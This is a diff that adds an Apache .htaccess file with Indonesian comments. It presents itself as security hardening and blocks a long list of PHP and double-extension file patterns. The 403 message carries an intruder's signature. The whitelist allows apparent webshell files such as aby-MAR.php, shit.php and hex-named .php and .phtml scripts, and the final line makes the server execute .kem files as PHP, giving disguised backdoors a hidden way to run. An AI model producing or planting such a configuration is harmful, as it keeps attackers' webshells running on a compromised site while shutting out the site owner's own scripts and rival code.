@@ -1,0 +1,62 @@
+# ========================
+# PESAN 403 CUSTOM
+# ========================
+ErrorDocument 403 "isc2k17's here_0x"
+
+# ========================
+# MATIKAN INDEXING
+# ========================
+Options -Indexes
+
+# ========================
+# REWRITE STANDARD
+# ========================
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteBase /
+
+    # JANGAN 403 halaman root (/), tapi 403 kalau akses subfolder/ langsung
+    RewriteCond %{REQUEST_URI} /$
+    RewriteCond %{REQUEST_URI} !^/$
+    RewriteRule ^ - [F]
+
+    # Front controller
+    RewriteRule ^index\.php$ - [L]
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule . /index.php [L]
+</IfModule>
+
+# ========================
+# BLOK EKSTENSI BERBAHAYA (Apache 2.4 native)
+# ========================
+# Catatan: ini memblokir eksekusi/akses langsung file-file dengan pola di bawah.
+# Pastikan file yang memang harus diakses (seperti index.php) di-whitelist di bagian berikutnya.
+
+<IfModule mod_authz_core.c>
+<FilesMatch ".(php|Php|pHp|phP|PHp|pHP|PhP|PHP|pht|Pht|pHt|phT|PHt|pHT|PhT|PHT|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PhP7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml)$">
+    Require all denied
+</FilesMatch>
+</IfModule>
+
+# ========================
+# WHITELIST FILE-FILE YANG BOLEH DIAKSES
+# ========================
+# Pastikan index.php tidak ikut ke-blok (dan file lain yang memang perlu).
+<IfModule mod_authz_core.c>
+<FilesMatch "^(index\.php|aby-MAR\.php|aby\.php|2aby\.php|math\.php|hosting-eu-MAR\.php|mee\.php|zindexing\.php|2023_07_12_000000_create_users_table\.php|2023_10_12_000000_create_users_table\.php|66db375901f65\.phtml|66db373985ee7\.phtml|wv2-MAR\.php|Handler\.php|shit\.php|10003_1742202199\.php|-1724750634\.php|term-MAR\.php|www-MAR\.php|1\.php|68ea4f0570e84\.phtml|02a982b92a4b279fd42bbb37220cbf1e\.php|e76546ebf138ebee36bba2bae597129f\.php|web\.php|1\.phtml)$">
+    Require all granted
+</FilesMatch>
+</IfModule>
+
+# ========================
+# (OPSIONAL) KOMPATIBILITAS APACHE 2.2
+# ========================
+# Jika server kamu masih pakai mod_access_compat, kamu bisa tambahkan versi lama:
+# <FilesMatch "...pola panjang...">Order allow,deny Deny from all</FilesMatch>
+# <FilesMatch "^(index\.php|...dll)$">Order allow,deny Allow from all</FilesMatch>
+
+# ========================
+# MIME TYPE TAMBAHAN
+# ========================
+AddType application/x-httpd-php .kem
